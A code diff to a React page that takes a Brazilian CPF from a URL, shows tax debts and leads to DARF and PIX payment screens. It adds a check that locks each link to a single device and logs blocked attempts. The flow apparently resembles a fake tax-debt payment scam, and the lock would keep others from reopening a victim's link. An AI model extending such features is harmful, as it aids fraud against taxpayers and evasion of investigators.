@@ -16,7 +16,7 @@ import SplashScreen from "@/components/SplashScreen";
 import { useTracking } from "@/hooks/useTracking";
 import { supabase } from "@/integrations/supabase/client";
 
-type Screen = "splash" | "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment" | "paid" | "pendencia-error" | "checking-pendencias";
+type Screen = "splash" | "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment" | "paid" | "pendencia-error" | "checking-pendencias" | "device-blocked";
 type Tab = "inicio" | "consultas" | "seguranca" | "ajuda";
 const recaptchaTokenStore = { current: "" };
 
@@ -49,7 +49,7 @@ const Index = () => {
   const [pixCopiaCola, setPixCopiaCola] = useState("");
   const [transactionId, setTransactionId] = useState("");
   const [novaPendenciaValor, setNovaPendenciaValor] = useState(0);
-  const { trackEvent } = useTracking();
+  const { trackEvent, checkDeviceLock } = useTracking();
   const totalValor = result?.pendencias.reduce((s, p) => s + p.valorTotal, 0) ?? 0;
   const autoStarted = useRef(false);
 
@@ -60,13 +60,21 @@ const Index = () => {
       const cleanCpf = cpfParam.replace(/\D/g, "");
       if (cleanCpf.length === 11) {
         setCpf(cleanCpf);
-        setScreen("loading");
-        trackEvent("cpf_submitted", cleanCpf, { source: "url" });
+        // Check device lock before allowing access
+        checkDeviceLock(cleanCpf).then((res) => {
+          if (res.allowed) {
+            setScreen("loading");
+            trackEvent("cpf_submitted", cleanCpf, { source: "url" });
+          } else {
+            setScreen("device-blocked");
+            trackEvent("device_blocked", cleanCpf, { reason: res.reason });
+          }
+        });
       } else {
         setScreen("input");
       }
     }
-  }, [cpfParam, trackEvent]);
+  }, [cpfParam, trackEvent, checkDeviceLock]);
 
   // Sync tab from navigation state
   useEffect(() => {
@@ -186,6 +194,24 @@ const Index = () => {
           setShowSplash(false);
         }}
       />
+    );
+  }
+
+  if (screen === "device-blocked") {
+    return (
+      <div className="min-h-screen bg-background flex items-center justify-center p-4">
+        <div className="bg-card border border-destructive/30 rounded-2xl p-8 max-w-md text-center shadow-lg">
+          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/10 flex items-center justify-center">
+            <svg className="w-8 h-8 text-destructive" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+          </div>
+          <h2 className="text-xl font-bold text-foreground mb-2">Acesso Restrito</h2>
+          <p className="text-muted-foreground text-sm leading-relaxed">
+            Este link já foi acessado por outro dispositivo. Por motivos de segurança, cada link de consulta só pode ser utilizado em um único dispositivo.
+          </p>
+        </div>
+      </div>
     );
   }
 
